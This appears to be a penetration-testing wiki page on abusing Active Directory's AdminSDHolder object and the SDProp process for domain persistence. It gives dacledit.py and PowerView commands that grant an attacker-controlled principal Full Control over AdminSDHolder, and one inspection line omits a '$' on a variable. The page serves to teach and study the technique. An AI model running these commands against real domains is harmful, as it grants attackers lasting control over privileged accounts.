# AdminSDHolder

## Theory

AdminSdHolder protects domain objects against permission changes. "AdminSdHolder" either refers to a domain object, a "worker code" or an operation depending on the context.&#x20;

The operation consists in the PDC (Principal Domain Controller) Emulator restoring pre-set permissions for high-privilege users every 60 minutes. Understanding what DACLs/ACEs are and how to abuse them is a requirement to the understanding of this persistence technique (see [Access Controls abuse](../movement/dacl/)).

The operation is conducted by a "worker code" called **SDProp** (Security Descriptor propagator).&#x20;

SDProp propagates AdminSdHolder's DACL to every protected object every 60 minutes if their DACL is different.

The AdminSdHolder object is located at `CN=AdminSdHolder,CN=SYSTEM,DC=DOMAIN,DC=LOCAL`. For instance, the default AdminSdHolder object's DACL contains the following.

* Authenticated Users: **Read**
* SYSTEM: **Full Control**
* Administrators: **Modify**
* Domain Admins: **ReadAndExecute**
* Enterprise Admins: **ReadAndExecute**

The default protected objects are the following.

* members (possibly nested) of the following groups: `Account Operators`, `Administrators`, `Backup Operators`, `Domain Admins`, `Domain Controllers`, `Enterprise Admins`, `Print Operators`, `Read-only Domain Controllers`, `Replicator`, `Schema Admins`, `Server Operators`
* the following users: `Administrator`, `krbtgt`

{% hint style="info" %}
When talking about AdminSdHolder, the **AdminCount** attribute is usually mentioned. This attribute is automatically set on an object when adding it to a protected group. Originally, the purpose was to improved SDProp's performance. AdminCount cannot be used for malicious purposes and is now mainly informative.
{% endhint %}

## Practice

Once sufficient privileges are obtained, attackers can abuse AdminSdHolder to get persistence on the domain by modifying the AdminSdHolder object's DACL.&#x20;

Let's say an attacker adds the following ACE to AdminSdHolder's DACL: `attackercontrolleduser: Full Control`.

At the next run of SDProp, `attackercontrolleduser` will have a `GenericAll` privilege over all protected objects (Domain Admins, Domain Controllers, and so on).

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, this can be done with [Impacket](https://github.com/SecureAuthCorp/impacket)'s dacledit.py (Python).

:warning: _At the time of writing, May 2nd 2022, the_ [_Pull Request (#1291)_](https://github.com/SecureAuthCorp/impacket/pull/1291) _is still pending._

```bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' 'domain'/'user':'password'
```

AdminSdHolder's DACL can then be inspected with the same utility.

```bash
dacledit.py -action 'read' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' 'domain'/'user':'password'
```
{% endtab %}

{% tab title="Windows" %}
This can be done in PowerShell with `Add-DomainObjectAcl` from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)'s [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) module.

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' -PrincipalIdentity spotless -Verbose -Rights All
```

AdminSdHolder's DACL can then be inspected with `Get-DomainObjectAcl`.

```powershell
# Inspect all AdminSdHolder's DACL
Get-DomainObjectAcl -SamAccountName "AdminSdHolder" -ResolveGUIDs

# Inspect specific rights an object has on AdminSdHolder (example with a user)
sid = Get-DomainUser "someuser" | Select-Object -ExpandProperty objectsid
Get-DomainObjectAcl -SamAccountName "AdminSdHolder" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq $sid}
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://adsecurity.org/?p=1906" %}

{% embed url="https://docs.microsoft.com/en-us/archive/blogs/askds/five-common-questions-about-adminsdholder-and-sdprop" %}

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence" %}
